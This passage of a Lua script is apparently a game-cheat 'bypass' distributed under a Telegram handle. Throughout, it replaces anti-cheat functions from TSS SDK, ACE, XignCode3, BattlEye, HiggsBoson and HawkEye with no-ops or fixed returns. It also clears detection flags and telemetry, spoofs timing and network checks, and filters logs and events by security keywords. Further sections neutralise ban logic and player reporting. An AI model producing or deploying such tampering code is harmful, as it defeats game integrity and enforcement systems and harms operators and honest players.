        local TssSdk = _G.TssSdk or package.loaded["TssSdk"]
        if TssSdk then
            TssSdk.OnRecvData = nop
            TssSdk.SendReportInfo = nop
            TssSdk.ScanMemory = retTrue
            TssSdk.IsEmulator = retFalse
            TssSdk.GetTssSdkReportInfo = retEmptyString
            TssSdk.ReportException = nop
            TssSdk.ReportData = nop
            TssSdk.CheckIntegrity = retTrue
            TssSdk.VerifySignature = retTrue
            TssSdk.CollectEvidence = retNil
            TssSdk.UploadLog = nop
            TssSdk.SendAntiData = nop
            TssSdk.ReportGameStart = nop
            TssSdk.ReportGameEnd = nop
            TssSdk.ReportCrash = nop
            TssSdk.ReportViolation = nop
            TssSdk.ReportSuspicious = nop
            TssSdk.ReportBan = nop
            TssSdk.ReportKick = nop
            TssSdk.ReportSuspend = nop
            TssSdk.ReportFlag = nop
            TssSdk.ReportInfo = nop
            TssSdk.ReportDebug = nop
            TssSdk.ReportError = nop
            TssSdk.ReportFatal = nop
            TssSdk.ReportMemory = nop
            TssSdk.ReportProcess = nop
            TssSdk.ReportModule = nop
            TssSdk.ReportThread = nop
            TssSdk.ReportFile = nop
            TssSdk.ReportNetwork = nop
            TssSdk.ReportDevice = nop
            TssSdk.ReportSystem = nop
            TssSdk.ReportGame = nop
            TssSdk.ReportUser = nop
            TssSdk.ReportAccount = nop
            TssSdk.ReportSession = nop
            TssSdk.ReportPerformance = nop
            TssSdk.ReportBattery = nop
            TssSdk.ReportTemperature = nop
            TssSdk.ReportFPS = nop
            TssSdk.ReportPing = nop
            TssSdk.ReportPacket = nop
            TssSdk.ReportCheat = nop
            TssSdk.ReportHack = nop
            TssSdk.ReportMod = nop
            TssSdk.ReportInject = nop
            TssSdk.ReportDebugger = nop
            TssSdk.ReportEmulator = nop
            TssSdk.ReportRoot = nop
            TssSdk.ReportJailbreak = nop
            TssSdk.ReportVM = nop
            TssSdk.ReportHook = nop
            TssSdk.ReportPatch = nop
            TssSdk.ReportTamper = nop
            TssSdk.ReportCorrupt = nop
            TssSdk.ReportInvalid = nop
            TssSdk.ReportSpoof = nop
            TssSdk.ReportFake = nop
            TssSdk.ReportClone = nop
            TssSdk.ReportDuplicate = nop
            TssSdk.ReportConflict = nop
            TssSdk.ReportOverlap = nop
            TssSdk.ReportMismatch = nop
            TssSdk.ReportInconsistent = nop
            TssSdk.ReportUnexpected = nop
            TssSdk.ReportUnknown = nop
        end
    end)
    print("[BYPASS] ✅ TSS SDK TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 18. ACE (Anti-Cheat Expert) Blocking TG BY ~ @ASURVIPMOD
-- ============================================================

local function BlockAce()
    pcall(function()
        local ace = _G.ace or package.loaded["libace.so"]
        if ace then
            ace.ReportData = nop
            ace.CheckIntegrity = retTrue
            ace.ScanMemory = retFalse
            ace.VerifyProcess = retTrue
            ace.CheckModule = retTrue
            ace.ReportViolation = nop
            ace.KickPlayer = nop
            ace.BanPlayer = nop
            ace.CollectInfo = retEmpty
            ace.SendReport = nop
            ace.ValidateClient = retTrue
            ace.CheckDebugger = retFalse
            ace.CheckEmulator = retFalse
            ace.CheckRoot = retFalse
            ace.ReportCheat = nop
            ace.ReportHack = nop
            ace.ReportMod = nop
            ace.ReportInject = nop
            ace.ReportHook = nop
            ace.ReportPatch = nop
            ace.ReportTamper = nop
            ace.ReportCorrupt = nop
            ace.ReportInvalid = nop
            ace.ReportSpoof = nop
            ace.ReportFake = nop
        end
    end)
    print("[BYPASS] ✅ ACE (Anti-Cheat Expert) TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 19. XignCode3 Blocking TG BY ~ @ASURVIPMOD
-- ============================================================

local function BlockXignCode()
    pcall(function()
        local XignCode = _G.XignCode or package.loaded["xigncode"]
        if XignCode then
            XignCode.SendReport = nop
            XignCode.CheckProcess = retTrue
            XignCode.VerifyIntegrity = retTrue
            XignCode.ScanModules = retEmpty
            XignCode.ReportException = nop
            XignCode.ValidateMemory = retTrue
            XignCode.CheckDebugger = retFalse
            XignCode.KickPlayer = nop
            XignCode.BanPlayer = nop
            XignCode.EncryptData = function(data) return data end
            XignCode.DecryptData = function(data) return data end
            XignCode.ReportCheat = nop
            XignCode.ReportHack = nop
            XignCode.ReportMod = nop
            XignCode.ReportInject = nop
            XignCode.ReportHook = nop
            XignCode.ReportPatch = nop
            XignCode.ReportTamper = nop
        end
    end)
    print("[BYPASS] ✅ XignCode3 TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 20. BattlEye Blocking TG BY ~ @ASURVIPMOD
-- ============================================================

local function BlockBattlEye()
    pcall(function()
        local BattlEye = _G.BattlEye or package.loaded["BattlEye"]
        if BattlEye then
            BattlEye.SendReport = nop
            BattlEye.KickPlayer = nop
            BattlEye.ValidatePlayer = retTrue
            BattlEye.CheckMemory = retTrue
            BattlEye.VerifyIntegrity = retTrue
            BattlEye.ReportViolation = nop
            BattlEye.ScanProcess = retTrue
            BattlEye.BanPlayer = nop
            BattlEye.CollectEvidence = retEmpty
            BattlEye.ReportCheat = nop
            BattlEye.ReportHack = nop
            BattlEye.ReportMod = nop
            BattlEye.ReportInject = nop
            BattlEye.ReportHook = nop
        end
    end)
    print("[BYPASS] ✅ BattlEye TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 21. JNI Anti-Cheat Blocking TG BY ~ @ASURVIPMOD
-- ============================================================

local function BlockJNIAntiCheat()
    pcall(function()
        local jni_ac = _G.JNI and _G.JNI.AntiCheat
        if jni_ac then
            jni_ac.CheckRoot = retFalse
            jni_ac.CheckEmulator = retFalse
            jni_ac.CheckDebugger = retFalse
            jni_ac.CollectInfo = retEmpty
            jni_ac.SendReport = nop
            jni_ac.Validate = retTrue
            jni_ac.CheckRootAccess = retFalse
            jni_ac.CheckEmulatorAccess = retFalse
            jni_ac.CheckDebuggerAccess = retFalse
            jni_ac.CheckMemoryAccess = retTrue
            jni_ac.CheckProcessAccess = retTrue
            jni_ac.CheckFileAccess = retTrue
            jni_ac.CheckNetworkAccess = retTrue
            jni_ac.CheckSystemAccess = retTrue
            jni_ac.CheckDeviceAccess = retTrue
            jni_ac.CheckAPIAccess = retTrue
            jni_ac.CheckSDKAccess = retTrue
            jni_ac.CheckLibraryAccess = retTrue
            jni_ac.CheckFrameworkAccess = retTrue
            jni_ac.CheckPackageAccess = retTrue
        end
    end)
    print("[BYPASS] ✅ JNI Anti-Cheat TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 22. Anti-Debugging and Emulator Detection Blocking TG BY ~ @ASURVIPMOD
-- ============================================================

local function BlockAntiDebugging()
    pcall(function()
        local DebuggerDetect = _G.DebuggerDetect or package.loaded["DebuggerDetect"]
        if DebuggerDetect then
            DebuggerDetect.IsDebuggerPresent = retFalse
            DebuggerDetect.CheckBreakpoint = retFalse
            DebuggerDetect.CheckTracer = retFalse
            DebuggerDetect.CheckDebug = retFalse
            DebuggerDetect.CheckDebugger = retFalse
            DebuggerDetect.DetectDebugger = retFalse
            DebuggerDetect.DetectBreakpoint = retFalse
            DebuggerDetect.DetectTracer = retFalse
            DebuggerDetect.DetectDebug = retFalse
        end

        local EmulatorDetect = _G.EmulatorDetect or package.loaded["EmulatorDetect"]
        if EmulatorDetect then
            EmulatorDetect.IsEmulator = retFalse
            EmulatorDetect.GetEmulatorType = retEmptyString
            EmulatorDetect.CheckVM = retFalse
            EmulatorDetect.Detect = retFalse
            EmulatorDetect.DetectEmulator = retFalse
            EmulatorDetect.DetectVM = retFalse
            EmulatorDetect.DetectVirtualMachine = retFalse
            EmulatorDetect.DetectEmulatorType = retEmptyString
        end
    end)
    print("[BYPASS] ✅ Anti-Debugging and Emulator Detection TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 23. Zero Trace Cleanup TG BY ~ @ASURVIPMOD
-- ============================================================

local function ZeroTraceCleanup()
    pcall(function()
        local suspiciousVars = {
            "bIsCheating", "bDetected", "bBanned", "SuspicionScore",
            "CheatDetected", "AntiCheatFlag", "IsHacking", "bReported",
            "TrustScore", "SecurityFlag", "ViolationLevel", "BanStatus",
            "bIsBan", "bIsKick", "bIsReported", "CheatCount",
            "ViolationCount", "SecurityScore", "TrustLevel",
            "bIsCheater", "bIsHacker", "bIsModder", "bIsInjector",
            "bIsHooker", "bIsPatcher", "bIsTamperer", "bIsCorrupter",
            "bIsInvalid", "bIsSpoofer", "bIsFaker", "bIsCloner",
            "bIsDuplicator", "bIsConflicter", "bIsOverlapper", "bIsMismatcher",
            "bIsInconsistent", "bIsUnexpected", "bIsUnknown", "bIsSuspicious",
            "bIsAbnormal", "bIsCorrupt", "bIsTampered", "bIsModified",
            "bIsInjected", "bIsHooked", "bIsPatched", "bIsSpoofed",
            "bIsFaked", "bIsCloned", "bIsDuplicated", "bIsConflicted",
            "bIsOverlapped", "bIsMismatched", "bIsInconsistent"
        }
        for _, var in ipairs(suspiciousVars) do _G[var] = nil end
        
        _G.TelemetryQueue = {}
        _G.LogQueue = {}
        _G.ReportQueue = {}
        _G.ExceptionQueue = {}
        _G.CrashQueue = {}
        _G.TraceQueue = {}
        
        _G.bTelemetryEnabled = false
        _G.bLoggingEnabled = false
        _G.bReportingEnabled = false
        _G.bExceptionReportingEnabled = false
        _G.bCrashReportingEnabled = false
        _G.bTracingEnabled = false
        
        collectgarbage("collect")
    end)
    print("[BYPASS] ✅ Zero Trace Cleanup Done TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 24. End Game Protection TG BY ~ @ASURVIPMOD
-- ============================================================

local function EndGameProtection()
    pcall(function()
        local ticker = _safe_require("common.time_ticker")
        if ticker and ticker.AddTimerLoop then
            ticker.AddTimerLoop(1.0, function()
                pcall(function()
                    local GameplayData = _safe_require("GameLua.GameCore.Data.GameplayData")
                    if GameplayData then
                        local pc = GameplayData.GetPlayerController()
                        if _isValid(pc) then
                            if pc.HiggsBoson then
                                pc.HiggsBoson.bMHActive = false
                                pc.HiggsBoson.bCallPreReplication = false
                            end
                            if pc.HiggsBosonComponent then
                                pc.HiggsBosonComponent.bMHActive = false
                                pc.HiggsBosonComponent.bCallPreReplication = false
                            end
                        end
                    end
                end)
            end, -1, 1.0)
        end
    end)
    print("[BYPASS] ✅ End Game Protection Activated TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 25. Memory Protection TG BY ~ @ASURVIPMOD
-- ============================================================

local function MemoryProtection()
    pcall(function()
        local MemoryProtect = import("MemoryProtect")
        if MemoryProtect then
            MemoryProtect.VirtualProtect = function(addr, size, protect) return true end
            MemoryProtect.IsMemoryReadable = function(addr) return false end
            MemoryProtect.IsMemoryWritable = function(addr) return false end
            MemoryProtect.CheckMemory = retTrue
            MemoryProtect.ProtectMemory = retTrue
            MemoryProtect.UnprotectMemory = retTrue
            MemoryProtect.ValidateMemory = retTrue
            MemoryProtect.VerifyMemory = retTrue
        end
        
        if _G.Memory then
            _G.Memory.IntegrityCheck = retTrue
            _G.Memory.VerifyModule = retTrue
            _G.Memory.CheckCRC = retTrue
            _G.Memory.ScanModifications = retFalse
        end
        
        if debug then
            debug.getinfo = function() return {} end
            debug.sethook = function() end
            debug.getlocal = function() return nil end
            debug.setlocal = function() end
            debug.getupvalue = function() return nil end
            debug.setupvalue = function() end
        end
    end)
    print("[BYPASS] ✅ Memory Protection Activated TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 26. Network Monitoring Blocking TG BY ~ @ASURVIPMOD
-- ============================================================

local function BlockNetworkMonitoring()
    pcall(function()
        local NetworkManager = import("NetworkManager")
        if NetworkManager then
            NetworkManager.GetNetworkStats = function() return {ping=40, loss=0, rtt=40} end
            NetworkManager.CapturePackets = function() end
            NetworkManager.AnalyzeTraffic = function() return {} end
            NetworkManager.GetConnectionInfo = function() return "127.0.0.1:8080" end
            NetworkManager.MonitorTraffic = function() end
            NetworkManager.ReportTraffic = function() end
            NetworkManager.ReportNetwork = function() end
            NetworkManager.ReportBandwidth = function() end
            NetworkManager.ReportLatency = function() end
            NetworkManager.ReportPacketLoss = function() end
        end
        
        if _G.Network then
            _G.Network.IsVPN = retFalse
            _G.Network.IsProxy = retFalse
            _G.Network.CheckNetworkType = function() return "WIFI" end
            _G.Network.IsNetworkError = retFalse
            _G.Network.ValidateConnection = retTrue
            _G.Network.VerifyNetwork = retTrue
            _G.Network.CheckLatency = function() return 20 end
            _G.Network.GetPacketLoss = function() return 0 end
            _G.Network.IsSuspicious = retFalse
            _G.Network.IsCompromised = retFalse
        end
    end)
    print("[BYPASS] ✅ Network Monitoring TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 27. Timing Check Spoofing TG BY ~ @ASURVIPMOD
-- ============================================================

local function TimingCheckSpoof()
    pcall(function()
        local Engine = import("Engine")
        if Engine then
            Engine.GetAverageFPS = function() return 60 end
            Engine.GetFrameTime = function() return 0.016 end
            Engine.IsLagging = retFalse
            Engine.GetDeltaTime = function() return 0.033 end
            Engine.GetTime = function() return os.time() end
            Engine.GetTimestamp = function() return os.time() end
            Engine.GetTick = function() return os.clock() end
            Engine.GetSeconds = function() return os.time() end
            Engine.GetMilliseconds = function() return os.time() * 1000 end
            Engine.GetMicroseconds = function() return os.time() * 1000000 end
        end

        local GameTime = package.loaded["GameLua.GameCore.Data.GameTime"]
        if GameTime then
            GameTime.GetServerTime = function() return os.time() end
            GameTime.GetDeltaTime = function() return 0.033 end
            GameTime.GetGameTime = function() return os.time() end
            GameTime.GetRealTime = function() return os.time() end
            GameTime.GetTickTime = function() return os.clock() end
            GameTime.GetFrameTime = function() return 0.016 end
        end
    end)
    print("[BYPASS] ✅ Timing Check Spoofing Done TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 28. Client Entry Bypass TG BY ~ @ASURVIPMOD
-- ============================================================

local function ClientEntryBypass()
    pcall(function()
        if Client then
            Client.SetTssNetworkStatus = nop
            Client.GEMReportEnterLobbyEvent = nop
            Client.TPerforPlatDisconnectReport = nop
            Client.IsConnected = function(NetInterface) return true end
            Client.GetUnrealNetworkStatus = nopstr
            Client.MD5LuaString = function(str) return "BYPASSED_MD5" end
            Client.GetDSVersion = function() return "999.999.999" end
            Client.IsInReplayState = nopfalse
        end
        
        if NetManager then
            NetManager.ProcRespondMsg = nop
            NetManager.isLogMsgAfterLogin = false
            NetManager.logMsgMap = {}
        end
        
        if EventSystem then
            local oldPost = EventSystem.postEvent
            EventSystem.postEvent = function(eventType, eventID, ...)
                if eventID and type(eventID) == "string" then
                    local blocked = {"SECURITY", "CHEAT", "BAN", "REPORT", "FLAG", 
                                    "VIOLATION", "DETECT", "VERIFY", "ANTI", "AC_",
                                    "SUSPICIOUS", "ABNORMAL", "MONITOR", "TRACK",
                                    "TELEMETRY", "ANALYTICS", "CRASH", "DUMP",
                                    "MAGIC", "BULLET", "HITBOX", "DAMAGE", "SHOOT",
                                    "PROJECTILE", "VERIFICATION", "VALIDATION",
                                    "SKIN", "AVATAR", "WEAPON", "VEHICLE", "EQUIPMENT",
                                    "GAMEGUARDIAN", "CHEATENGINE", "ROOT", "JAILBREAK",
                                    "EMULATOR", "TAMPER", "SPEEDHACK", "ESP", "WALLHACK",
                                    "NORECOIL", "PLAYERREPORT", "REPORTCOOLDOWN"}
                    for _, be in ipairs(blocked) do
                        if eventID:find(be) then return end
                    end
                end
                if oldPost then oldPost(eventType, eventID, ...) end
            end
        end
        
        local logFuncs = {"log", "log_warning", "log_error", "log_shipping_client", "log_format", "log_tree"}
        for _, funcName in ipairs(logFuncs) do
            if _G[funcName] then
                _G[funcName] = function(...)
                    local args = {...}
                    for _, arg in ipairs(args) do
                        if type(arg) == "string" and (
                            arg:find("cheat") or arg:find("security") or arg:find("ban") or
                            arg:find("detect") or arg:find("verify") or arg:find("integrity") or
                            arg:find("report") or arg:find("violation") or arg:find("hack") or
                            arg:find("anti") or arg:find("ac_") or arg:find("suspicious") or
                            arg:find("abnormal") or arg:find("monitor") or arg:find("track") or
                            arg:find("magic") or arg:find("bullet") or arg:find("hitbox") or
                            arg:find("damage") or arg:find("shoot") or arg:find("projectile") or
                            arg:find("skin") or arg:find("avatar") or arg:find("weapon") or
                            arg:find("vehicle") or arg:find("equipment") or
                            arg:find("gameguardian") or arg:find("cheatengine") or
                            arg:find("root") or arg:find("jailbreak") or
                            arg:find("emulator") or arg:find("tamper") or
                            arg:find("speedhack") or arg:find("esp") or arg:find("wallhack") or
                            arg:find("norecoil") or arg:find("playerreport")
                        ) then return end
                    end
                end
            end
        end
        
        if LogUtil then
            LogUtil.SetForceLog = nop
            LogUtil.SetLogTreeEnable = nop
            LogUtil.SetWriteLog = nop
        end
        
        if sandbox then 
            sandbox.LogError = nop
            sandbox.LogWarning = nop 
        end
    end)
    print("[BYPASS] ✅ Client Entry Bypass Done TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 29. HiggsBoson Bypass TG BY ~ @ASURVIPMOD
-- ============================================================

local function HiggsBosonBypass()
    pcall(function()
        if CHiggsBosonComponent then
            CHiggsBosonComponent.ReceiveBeginPlay = nop
            CHiggsBosonComponent.StaticShowSecurityAlertInDev = nop
            CHiggsBosonComponent.ShowABCD = nop
            CHiggsBosonComponent._ClientShowSecurityAlertWindow = nop
            CHiggsBosonComponent._ReportChatRobot = nop
            CHiggsBosonComponent.SendAntiDataFlow = nop
            CHiggsBosonComponent.SendHitFireBtnFlow = nop
            CHiggsBosonComponent.OnBattleResult = nop
            CHiggsBosonComponent.SendHisarData = nop
            CHiggsBosonComponent.RPC_Client_ShowSecurityAlertWindow = nop
            CHiggsBosonComponent.RPC_Server_TellServerName = nop
            CHiggsBosonComponent.RecordStrategyTimestampInReplay = nop
            CHiggsBosonComponent.SkipAlertServer = nop
            CHiggsBosonComponent.SetClientAlertWindowEnabled = nop
            CHiggsBosonComponent.IsCharacterOwnerWerewolf = nopfalse
            CHiggsBosonComponent.IsCharacterOwnerButcher = nopfalse
            CHiggsBosonComponent._ProcessReportChatRobotQueue = nop
            CHiggsBosonComponent.LuaNotifySecurityAbnormalJump = nop
            CHiggsBosonComponent.bSkipAlertServer = true
            CHiggsBosonComponent.bMHActive = false
            CHiggsBosonComponent.bCallPreReplication = false
            bIsSkipAlertServer = true
            bSkipUploadNoschat = true
            _nReportNosChatTimerID = nil
            _nReportNosChatMessageID = 0
            _tReportNosChatQueue = {}
            LastTimeHandleAlert = -1
        end
        
        local GameplayData = _safe_require("GameLua.GameCore.Data.GameplayData")
        if GameplayData then
            local pc = GameplayData.GetPlayerController()
            if _isValid(pc) then
                if pc.HiggsBoson then
                    pc.HiggsBoson.bMHActive = false
                    pc.HiggsBoson.bCallPreReplication = false
                    pc.HiggsBoson.bSkipAlertServer = true
                end
                if pc.HiggsBosonComponent then
                    pc.HiggsBosonComponent.bMHActive = false
                    pc.HiggsBosonComponent.bCallPreReplication = false
                    pc.HiggsBosonComponent.bSkipAlertServer = true
                end
            end
        end
        
        local ticker = _safe_require("common.time_ticker")
        if ticker and ticker.AddTimerLoop then
            ticker.AddTimerLoop(1.0, function()
                pcall(function()
                    local GameplayData = _safe_require("GameLua.GameCore.Data.GameplayData")
                    if GameplayData then
                        local pc = GameplayData.GetPlayerController()
                        if _isValid(pc) then
                            if pc.HiggsBoson then
                                pc.HiggsBoson.bMHActive = false
                                pc.HiggsBoson.bCallPreReplication = false
                            end
                            if pc.HiggsBosonComponent then
                                pc.HiggsBosonComponent.bMHActive = false
                                pc.HiggsBosonComponent.bCallPreReplication = false
                            end
                        end
                    end
                end)
            end, -1, 1.0)
        end
    end)
    print("[BYPASS] ✅ HiggsBoson Bypass Done TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 30. HawkEye Patrol Bypass TG BY ~ @ASURVIPMOD
-- ============================================================

local function HawkEyeBypass()
    pcall(function()
        if ClientHawkEyePatrolSubsystem then
            ClientHawkEyePatrolSubsystem._OnHawkSync = nop
            ClientHawkEyePatrolSubsystem._OnHawkReportSuccess = nop
            ClientHawkEyePatrolSubsystem._OnRecvInspectorBroadcastCount = nop
            ClientHawkEyePatrolSubsystem.ReportCheat = nop
            ClientHawkEyePatrolSubsystem.RequestImprison = nop
            ClientHawkEyePatrolSubsystem.SendReportTLog = nop
            ClientHawkEyePatrolSubsystem.IsDuringHawkEyePatrol = nopfalse
            ClientHawkEyePatrolSubsystem._CollectBeWatchedPlayerInfo = nop
            ClientHawkEyePatrolSubsystem.HasReported = noptrue
            ClientHawkEyePatrolSubsystem.GetBeWatchedPlayerInfo = nopnil
            ClientHawkEyePatrolSubsystem._OnPlayerKilledOtherPlayer = nop
            ClientHawkEyePatrolSubsystem._StartFrameUIRefreshTimer = nop
            ClientHawkEyePatrolSubsystem.ExitWatching = nop
            ClientHawkEyePatrolSubsystem.WantMatchNextPatrol = nop
            ClientHawkEyePatrolSubsystem._InitHawkEyePatrolSubsystem = function(self)
                self._bHasInitialized = true
                self._bHasReported = true
            end
            ClientHawkEyePatrolSubsystem._StartHideUITimer = nop
            ClientHawkEyePatrolSubsystem._StartShowDistanceUITimer = nop
            ClientHawkEyePatrolSubsystem._StartCloseBattleEndedTipsTimer = nop
            ClientHawkEyePatrolSubsystem._StartBattleTimeUsageTimer = nop
            ClientHawkEyePatrolSubsystem._StartQuitVoiceRoomTimer = nop
            ClientHawkEyePatrolSubsystem._StartExitGameTimer = nop
            ClientHawkEyePatrolSubsystem._CloseExitGameTimer = nop
            ClientHawkEyePatrolSubsystem._CreateOvertimerTimerForNextPatrol = nop
            ClientHawkEyePatrolSubsystem.ClearNextPatrolOvertimeTimer = nop
            ClientHawkEyePatrolSubsystem.ReturnLobbyAndOpenH5 = nop
            ClientHawkEyePatrolSubsystem.ForceNeverCloseBattleEndedTips = nop
            ClientHawkEyePatrolSubsystem.CheckShowReportedTips = nopfalse
            ClientHawkEyePatrolSubsystem.TryShowReportedTips = nop
            ClientHawkEyePatrolSubsystem.ShowWatchEndedTips = nop
            ClientHawkEyePatrolSubsystem.HasShownWatchEndedTips = noptrue
            ClientHawkEyePatrolSubsystem.OnShowWatchEndedTips = nop
            ClientHawkEyePatrolSubsystem.OnClickLowerLeftExitWatching = nop
            ClientHawkEyePatrolSubsystem.OnClickBottomRightOpenReportWindow = nop
            ClientHawkEyePatrolSubsystem._MarkHasReported = nop
            ClientHawkEyePatrolSubsystem.GetForbidNextPatrolRemainingTimeInSeconds = function() return 0 end
            ClientHawkEyePatrolSubsystem.GetUsedDailyTimeInSeconds = function() return 0 end
            ClientHawkEyePatrolSubsystem.GetInspectorBroadcastCount = function() return -1 end
            ClientHawkEyePatrolSubsystem.GetMaxInspectorBroadcastCount = function() return 0 end
            ClientHawkEyePatrolSubsystem.CanInspectorBroadcast = nopfalse
            ClientHawkEyePatrolSubsystem.IsCharacterLocationShouldDraw = nopfalse
            ClientHawkEyePatrolSubsystem.InitHawkEyePatrolSubsystem = nop
            ClientHawkEyePatrolSubsystem._PostConstruct = function(self)
                self._bHasInitialized = true
                self._bHasReported = true
                self.nInspectorBroadcastCount = -1
            end
            ClientHawkEyePatrolSubsystem.OnRelease = nop
            ClientHawkEyePatrolSubsystem._bHasInitialized = true
            ClientHawkEyePatrolSubsystem._bHasReported = true
            ClientHawkEyePatrolSubsystem._bHasShownWatchEndedTips = true
            ClientHawkEyePatrolSubsystem.bShowBeReportedTips = true
            ClientHawkEyePatrolSubsystem.nInspectorBroadcastCount = -1
        end
        if DSHawkEyePatrolSubsystem then
            DSHawkEyePatrolSubsystem.OnInit = nop
            DSHawkEyePatrolSubsystem.ReportCheat = nop
            DSHawkEyePatrolSubsystem.RequestImprison = nop
        end
    end)
    print("[BYPASS] ✅ HawkEye Patrol Bypass Done TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 31. Ban Logic Bypass TG BY ~ @ASURVIPMOD
-- ============================================================

local function BanLogicBypass()
    pcall(function()
        if ClientBanLogic then
            ClientBanLogic.ReqBanInfo = nop
            ClientBanLogic.OnVoiceSwitchNotify = nop
            ClientBanLogic.OnVoiceBanNotify = nop
            ClientBanLogic.OnRealTimeVoiceBanNotify = nop
            ClientBanLogic.OnVoiceBanSuccess = nop
            ClientBanLogic.TryOpenVoice = function()
                EventSystem:postEvent(EVENTTYPE_INGAME_BAN, EVENTID_INGAME_BAN_FORBID_VOICE, false)
            end
            ClientBanLogic.IsVoiceReportEnable = nopfalse
            ClientBanLogic.OnSyncMicSuspicious = nop
            ClientBanLogic.OnSyncMicPreFilter = nop
            ClientBanLogic.OnSyncBanInfo = nop
            ClientBanLogic.OnNotifyWarningTips = nop
            ClientBanLogic.VoiceBanEndTime = 0
            ClientBanLogic.bEnableVoiceReport = false
            ClientBanLogic.SuspiciousFlag = 0
            ClientBanLogic.Reason = ""
            ClientBanLogic.IsTranslated = false
            ClientBanLogic.CheckBan = retFalse
            ClientBanLogic.IsBanned = retFalse
            ClientBanLogic.CheckBanStatus = retFalse
            ClientBanLogic.GetBanInfo = retEmpty
        end
        if RealTimeBan then
            RealTimeBan.Init = function() return end
            RealTimeBan.OnPlayerWithRealTimeBan = nop
            RealTimeBan.OnSyncPlayerInfo = nop
            RealTimeBan.HandleEnterGameModeFightingState = nop
            RealTimeBan.ShowAlias = nop
            RealTimeBan.SetOnRankInspectorUID = nop
            RealTimeBan.IsUIDOnRankInspector = nopfalse
            RealTimeBan.GetUIDInspectorRank = function() return -1 end
            RealTimeBan.SetInspectorBroadcastCountUID = nop
            RealTimeBan.GetUIDInspectorBroadcastCount = function() return -1 end
            RealTimeBan.GetTipsIDOffset = function() return 0 end
            RealTimeBan.GetTipsIDOffsetWithUID = function() return 0 end
            RealTimeBan.GetTipsIDOffsetInspector = function() return 0 end
            RealTimeBan.GMShowAlias = nop
            RealTimeBan.tOnRankInspectorUIDSet = {}
            RealTimeBan.tInspectorRankUIDSet = {}
            RealTimeBan.tInspectorBroadcastCountUIDSet = {}
            RealTimeBan.MaxAliasLevel = -1
            RealTimeBan.CurrentAlias = nil
            RealTimeBan.CurrentName = nil
            RealTimeBan.is_onrank_inspector = false
            RealTimeBan.inspector_rank = -1
            RealTimeBan.bHasOldAlias = false
            RealTimeBan.ShowTipsAliasConfig = {}
            RealTimeBan.DelayTime = {}
            RealTimeBan.OldShowTipsAlias = 0
            RealTimeBan.IsBanned = retFalse
            RealTimeBan.GetBanTime = retZero
            RealTimeBan.GetBanReason = retEmptyString
        end
        if BanSystem then
            BanSystem.CheckBan = retFalse
            BanSystem.IsBanned = retFalse
            BanSystem.GetBanReason = retEmptyString
            BanSystem.GetBanTime = retZero
            BanSystem.GetBanType = retZero
            BanSystem.IsPermanentlyBanned = retFalse
        end
        
        if _G.BanStatusCache then _G.BanStatusCache = nil end
        if _G.AccountBanCache then _G.AccountBanCache = {} end
        if _G.TemporaryBan then
            _G.TemporaryBan.BanStart = 0
            _G.TemporaryBan.BanEnd = 0
            _G.TemporaryBan.IsBanned = retFalse
        end
        if _G.Account then
            _G.Account.IsBanned = false
            _G.Account.BanStatus = 0
            _G.Account.WarningLevel = 0
            _G.Account.IsSuspicious = false
            _G.Account.BanExpiry = 0
            _G.Account.BanReason = ""
            _G.Account.BanCount = 0
            _G.Account.RiskLevel = 0
        end
    end)
    print("[BYPASS] ✅ Ban Logic Bypass Done TG BY ~ @ASURVIPMOD")
end

-- ============================================================
-- 32. Report System Bypass TG BY ~ @ASURVIPMOD
-- ============================================================

local function ReportSystemBypass()
    pcall(function()
        if ClientReportPlayerSubsystem then
            ClientReportPlayerSubsystem.OnInit = nop
            ClientReportPlayerSubsystem._OnPlayerKilledOtherPlayer = nop
            ClientReportPlayerSubsystem._RecordFatalDamager = nop
            ClientReportPlayerSubsystem._RecordMurdererFromDeathReplayData = nop
            ClientReportPlayerSubsystem._OnSyncFatalDamage = nop
            ClientReportPlayerSubsystem._SyncBattleResult = nop
            ClientReportPlayerSubsystem._OnBattleResult = nop
            ClientReportPlayerSubsystem._OnShowQuickReportMutualExclusiveUI = nop
            ClientReportPlayerSubsystem._OnHideQuickReportMutualExclusiveUI = nop
            ClientReportPlayerSubsystem._StartCheckGameModeTypeTimer = nop
            ClientReportPlayerSubsystem._CheckGameModeType = nop
            ClientReportPlayerSubsystem._StartCheckCurrentNotInTeamHistoricalTeammateTimer = nop
            ClientReportPlayerSubsystem._CheckCurrentNotInTeamHistoricalTeammate = nop
            ClientReportPlayerSubsystem._RecordTeammatePlayerInfo = nop
            ClientReportPlayerSubsystem._IsHealthStatusKilled = nopfalse
            ClientReportPlayerSubsystem.GetFatalDamagerMap = retEmpty
            ClientReportPlayerSubsystem.GetFatalDamagerMapSize = retZero
            ClientReportPlayerSubsystem.GetName2InfoMap = retEmpty
            ClientReportPlayerSubsystem.GetCachedTeammateName2InfoMap = retEmpty
            ClientReportPlayerSubsystem.GetTeammateName2InfoMapDuringBattle = retEmpty
            ClientReportPlayerSubsystem.GetCurrentNotInTeamHistoricalTeammateMap = retEmpty
            ClientReportPlayerSubsystem.GetInTeamIndexFromHistoricalTeammateInfo = function() return -1 end
            ClientReportPlayerSubsystem.IsGameModeTypeTeamDeathMatch = nopfalse
            ClientReportPlayerSubsystem.GetGameModeType = function() return -1 end
            ClientReportPlayerSubsystem.GetMainModeID = function() return -1 end
            ClientReportPlayerSubsystem.GetSubModeID = function() return -1 end
            ClientReportPlayerSubsystem.EnableRecordFatalDamage = nop
            ClientReportPlayerSubsystem._tKnockDownerMap = {}
            ClientReportPlayerSubsystem._tMurdererMap = {}
            ClientReportPlayerSubsystem._ds2history = {}
            ClientReportPlayerSubsystem._tMapCurrentNotInTeamHistoricalTeammate = {}
            ClientReportPlayerSubsystem._tTeammateName2InfoMap = {}
            ClientReportPlayerSubsystem._bEnableRecordFatalDamage = false
            ClientReportPlayerSubsystem._bIsGameModeTypeTeamDeathMatch = false
